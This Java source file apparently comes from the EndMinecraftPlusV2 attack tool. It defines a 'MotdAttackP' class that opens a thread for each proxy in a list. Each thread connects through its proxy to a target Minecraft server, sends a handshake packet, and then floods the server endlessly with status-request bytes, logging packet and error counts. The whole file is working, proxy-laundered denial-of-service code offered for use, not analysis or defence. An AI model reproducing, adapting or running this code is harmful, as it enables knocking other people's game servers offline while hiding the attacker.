package cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.AttackUtils;

import cn.serendipityr.EndMinecraftPlusV2.Tools.*;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class MotdAttackP extends IAttack {
    public List<Thread> threads = new ArrayList<>();
    private int runTimes = 0;
    private int errorTimes = 0;

    public MotdAttackP(String ip, int port, int time, int maxconnect, long joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void start() {
        Proxy.Type proxyType;
        switch (ConfigUtil.ProxyType) {
            case 3:
            case 2:
                proxyType = Proxy.Type.SOCKS;
                break;
            case 1:
            default:
                proxyType = Proxy.Type.HTTP;
                break;
        }

        for (String p: ProxyUtil.proxies) {
            try {
                String[] _p = p.split(":");
                Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                Thread thread = createThread(proxy, ip, port);
                thread.start();
                threads.add(thread);
                if (this.attack_maxconnect > 0 && (threads.size() > this.attack_maxconnect))
                    return;
            } catch (Exception e) {
                LogUtil.doLog(1,"发生错误: " + e, null);
            }
        }
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        threads.forEach(Thread::stop);
    }

    public Thread createThread(Proxy proxy, String ip, int port) {
        Runnable task = () -> {
            while (true) {
                try {
                    Socket socket = new Socket(proxy);
                    socket.connect(new InetSocketAddress(ip, port));
                    if (socket.isConnected()) {
                        LogUtil.doLog(0, "正在发送Motd刷新数据包...", "MotdAttackP#" + Thread.currentThread().getName());
                        OutputStream out = socket.getOutputStream();
                        out.write(new byte[]{0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01});
                        out.flush();
                        while (socket.isConnected()) {
                            for (int i = 0; i < 10; i++) {
                                SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - MotdAttack | 总连接数: " + threads.size() + "个 | 发包次数: " + runTimes + "次 | 错误次数: " + errorTimes);
                                out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01,
                                        0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
                                runTimes++;
                            }
                            out.flush();
                        }
                        try {
                            out.close();
                            socket.close();
                        } catch (IOException ignored) {
                        }

                        LogUtil.doLog(0, "连接已断开。", "MotdAttackP#" + Thread.currentThread().getName());
                    }
                } catch (Throwable e) {
                    LogUtil.doLog(0, "发生错误: " + e, "MotdAttackP#" + Thread.currentThread().getName());
                    errorTimes++;
                }

                OtherUtils.doSleep(attack_joinsleep);
            }
        };
        return new Thread(task);
    }
}
